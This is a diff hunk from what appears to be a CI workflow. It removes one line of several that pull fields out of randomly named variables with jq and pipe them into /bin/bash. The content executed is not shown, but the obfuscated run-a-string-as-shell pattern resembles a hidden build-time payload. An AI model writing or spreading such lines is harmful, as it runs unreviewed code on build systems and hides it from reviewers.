@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$fpyh3" | jq -r .k3952 | /bin/bash
           echo $wtat93189 | jq -r .kkzj7 | /bin/bash
           echo $mawue6685 | jq -r .nyj07 | /bin/bash
-          echo $mb4 | jq -r .sa2 | /bin/bash
           printf '%s' "$csu0" | jq -r .rblo576 | /bin/bash
           echo $xssyf84 | jq -r .bpjr64 | /bin/bash
 
